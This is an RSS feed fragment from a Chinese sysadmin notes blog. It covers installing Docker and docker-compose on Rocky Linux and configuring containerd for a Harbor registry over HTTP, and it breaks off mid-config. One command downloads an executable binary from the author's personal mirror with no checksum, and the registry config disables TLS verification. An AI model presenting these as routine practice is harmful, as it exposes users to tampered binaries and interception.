<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>RockyLinux安装Docker</title>
      <link>https://www.geekery.cn/note-book/Docker/RockyLinux%E5%AE%89%E8%A3%85Docker.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/RockyLinux%E5%AE%89%E8%A3%85Docker.html</guid>
      <source url="https://www.geekery.cn/rss.xml">RockyLinux安装Docker</source>
      <description>RockyLinux安装Docker 一键安装docker 安装docker-compose 以centos上可以直接用yum安装docker-compose的，在rocky linux上有冲突，只好手动安装了。 手工安装的这个docker-compose版本，交互效果更好看些，不过也有问题“会多出一些莫名的空容器，状态为Created”。 自己搭建的...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一键安装docker</h2>
<div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-shell"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel-release</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yum-utils</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device-mapper-persistent-data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lvm2</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum-config-manager</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --add-repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> makecache</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker-ce</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -l</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装docker-compose</h2>
<blockquote>
<p>以centos上可以直接用yum安装docker-compose的，在rocky linux上有冲突，只好手动安装了。
手工安装的这个docker-compose版本，交互效果更好看些，不过也有问题“会多出一些莫名的空容器，状态为Created”。</p>
</blockquote>
<div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-shell"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v2.2.2</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://github.com/docker/compose/releases/download/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/docker-compose-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/bin/docker-compose</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
<p>自己搭建的加速链接，避免github龟速</p>
</blockquote>
<div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-shell"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> docker_compose_version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v2.2.2</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://mirror-symbol.q32.top:8443/staticfile/software/虚拟化/docker/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/docker-compose-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/bin/docker-compose</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>一键运行web版本vscode</title>
      <link>https://www.geekery.cn/note-book/Docker/%E4%B8%80%E9%94%AE%E8%BF%90%E8%A1%8Cweb%E7%89%88%E6%9C%ACvscode.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E4%B8%80%E9%94%AE%E8%BF%90%E8%A1%8Cweb%E7%89%88%E6%9C%ACvscode.html</guid>
      <source url="https://www.geekery.cn/rss.xml">一键运行web版本vscode</source>
      <description>一键运行web版本vscode 安装docker-compose 以centos上可以直接用yum安装docker-compose的，在rocky linux上有冲突，只好手动安装了。 手工安装的这个docker-compose版本，交互效果更好看些，不过也有问题“会多出一些莫名的空容器，状态为Created”。 自己搭建的加速链接，避免github龟...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>安装docker-compose</h2>
<p>以centos上可以直接用yum安装docker-compose的，在rocky linux上有冲突，只好手动安装了。 手工安装的这个docker-compose版本，交互效果更好看些，不过也有问题“会多出一些莫名的空容器，状态为Created”。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v2.2.2</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://github.com/docker/compose/releases/download/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/docker-compose-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/bin/docker-compose</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>自己搭建的加速链接，避免github龟速</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v2.2.2</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://mirror-symbol.q32.top:8443/staticfile/software/虚拟化/docker/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">docker_compose_version</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/docker-compose-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)-$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">uname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">)"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/docker-compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/bin/docker-compose</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>docker-compose</h2>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-yaml"><span class="line"></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>为 Containerd 配置 Harbor 无证书镜像站</title>
      <link>https://www.geekery.cn/note-book/Docker/%E4%B8%BAContainerd%E9%85%8D%E7%BD%AEharbor%E6%97%A0%E8%AF%81%E4%B9%A6%E9%95%9C%E5%83%8F%E7%AB%99.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E4%B8%BAContainerd%E9%85%8D%E7%BD%AEharbor%E6%97%A0%E8%AF%81%E4%B9%A6%E9%95%9C%E5%83%8F%E7%AB%99.html</guid>
      <source url="https://www.geekery.cn/rss.xml">为 Containerd 配置 Harbor 无证书镜像站</source>
      <description>为 Containerd 配置 Harbor 无证书镜像站 目录结构要求 在 /etc/containerd 下需要有如下结构： v3 风格配置示例 1. hosts.toml 配置 路径：/etc/containerd/certs.d/11.0.1.143/hosts.toml 2. config.toml 中启用 certs.d 目录 路径：/et...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>目录结构要求</h2>
<p>在 <code>/etc/containerd</code> 下需要有如下结构：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@node1:/etc/containerd#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tree</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> certs.d</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">│</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   └──</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 11.0.1.143</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">│</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       └──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts.toml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config.toml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>v3 风格配置示例</h2>
<h3>1. <code>hosts.toml</code> 配置</h3>
<p>路径：<code>/etc/containerd/certs.d/11.0.1.143/hosts.toml</code></p>
<div class="language-toml line-numbers-mode" data-highlighter="shiki" data-ext="toml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-toml"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">server</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"http://11.0.1.143"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"http://11</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">143"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  capabilities</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"pull"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"push"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  skip_verify</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2. <code>config.toml</code> 中启用 <code>certs.d</code> 目录</h3>
<p>路径：<code>/etc/containerd/config.toml</code></p>
<p>只看与镜像相关的关键片段（v3 写法）：</p>
<div class="language-toml line-numbers-mode" data-highlighter="shiki" data-ext="toml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-toml"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">plugins</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"io</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">containerd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cri</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">v1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">images"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # 拉取镜像相关的通用配置</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  concurrent_downloads</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  concurrent_layer_downloads</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  concurrent_layer_fetch_buffer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  image_pull_progress_timeout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"5m0s"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  image_pull_with_sync_fs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">false</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  stats_collect_period</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  use_local_image_pull</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">false</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">plugins</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"io</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">containerd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cri</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">v1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">images"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pinned_images</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    sandbox</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"registry.k8s.io/pause:3.10"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # 关键：指定 registry 配置目录（v3 推荐方式）</span></span>
